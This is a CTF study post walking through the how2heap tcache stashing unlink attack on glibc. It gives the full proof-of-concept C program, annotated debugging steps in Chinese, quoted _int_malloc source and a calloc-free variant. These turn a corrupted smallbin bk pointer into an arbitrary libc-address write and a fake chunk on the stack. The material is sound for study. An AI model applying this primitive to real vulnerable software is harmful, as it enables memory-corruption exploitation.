---
layout: post
title: "how2heap 2.35 · tcache_stashing_unlink_attack"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "PWN"]
---
{% raw %}
# POC
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    printf("This file demonstrates the stashing unlink attack on tcache.\n\n");
    printf("This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n");
    printf("This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    printf("The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    printf("This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    printf("Stack_var emulates the fake chunk we want to alloc to.\n\n");
    printf("First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    printf("You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    printf("Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    printf("Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 chunks into tcache
    printf("Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    printf("As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    printf("Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);// size > 0x90

    //now 5 tcache bins
    printf("Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    printf("Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    printf("Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    printf("Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    printf("As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);

    assert(target == &stack_var[2]);
    return 0;
}

```
能够覆盖 victim->bk 指针时，可以使用此技术。此外，至少需要使用 calloc 分配一次数据块。最后，我们需要一个可写地址来绕过 glibc 中的检查。

这项技术允许我们向任何想要的位置写入 libc 地址，并在任何需要的地方创建fake chunk。

# 调试过程
## 1.在（victim+0x18）写一个任意可写地址
```
	stack_var[3] = (unsigned long)(&stack_var[2]);
```
*原因在 4.calloc触发攻击中*
改前全\x00
改后：起始地址为0x7fffffffd940。
![屏幕截图 2026-02-20 191347](/assets/ctf/244b09ac7071259fd3c4.webp)
ps：处tcache链表记录chunk的user date地址，其他全记录chunk地址（带head）。
## 2.布置堆区与bins
```
    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }
```
![屏幕截图 2026-02-20 190535](/assets/ctf/89d36b2b7f5c94b7c140.webp)
```
    //put 7 chunks into tcache
    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }
    //last tcache bin
    free(chunk_lis[1]);
```
![屏幕截图 2026-02-20 190720](/assets/ctf/840e24e3b5542ed9d3b5.webp)
![屏幕截图 2026-02-20 190734](/assets/ctf/2e26ec06869bb30c907f.webp)

```
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);
```
![屏幕截图 2026-02-20 190814](/assets/ctf/c632367185fcfd479ebf.webp)
![屏幕截图 2026-02-20 190845](/assets/ctf/8ba05090f3748b8d55af.webp)

```
	//触发整理机制，大小太小会直接被unsorted切。
    malloc(0xa0);// size > 0x90
```
![屏幕截图 2026-02-20 190915](/assets/ctf/7083320f953f1873119a.webp)

```
    //now 5 tcache bins    
    malloc(0x90);
    malloc(0x90);
```
![屏幕截图 2026-02-20 190930](/assets/ctf/6f3c7518b5728560bef5.webp)
![屏幕截图 2026-02-20 190947](/assets/ctf/97d49ccdb996a1ad4fb7.webp)
## 3.VULNERABILITY
```
    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/
```
改前：smallbins的entry，放glibc地址。
![屏幕截图 2026-02-20 192833](/assets/ctf/e04ca3b47b20c6b7bc22.webp)
改后：覆写victim地址（写入chunk head地址）。
![屏幕截图 2026-02-20 192803](/assets/ctf/f789c5edcfac17fcd3fd.webp)
## 4.calloc触发攻击
```
    //trigger the attack
    calloc(1,0x90);
```
*以下victim为目标写入地址。*
第一次：将剩余的一个chunk a放入tcache。（b已被申请走）
```
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;  //back为victim
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;  //向(victim+0x20)处写入glibc地址，之后被next指针覆盖。

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
```
第二次：将victim放入tcache。
```
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;  //victim中布置的地址(victim+0x20)
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;  //向(victim+0x20)+0x20处写入glibc地址。
		      //如果 1. 中不布置可写地址，这里可能会向未知的地址写东西，导致crash。

		    tcache_put (tc_victim, tc_idx);  
		    /*
		    向(victim+0x20)处写堆地址(上一步被放入的chunk)，在(victim+0x30)的位置写key
		    最后由于tcache的count刚好为7，结束整理。
		    */
	            }
		}
	    }
```

## 5.验证

```
    target = malloc(0x90); 

    assert(target == &stack_var[2]);
```

# `_int_malloc` smallbin部分源码

```
  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);    //取glibc入口地址

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
    //back chunk的fd指针是否为victim
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  向tcache中整理chunk。
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;
		//利用的主要逻辑。
	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;  //victin
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;  //向(victim+0x20)

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

# 另一种思路

原利用需要一次calloc绕过tcache直接从small bins申请chunk。这里提出另一种不用calloc的思路：

在目标区域的布置不变，同样申请chunk填满tcache，这之后申请6个small bins，再用malloc清空tcache，再次malloc触发，就能恰好将目标地址放入tcache，而不触发crash。
{% endraw %}
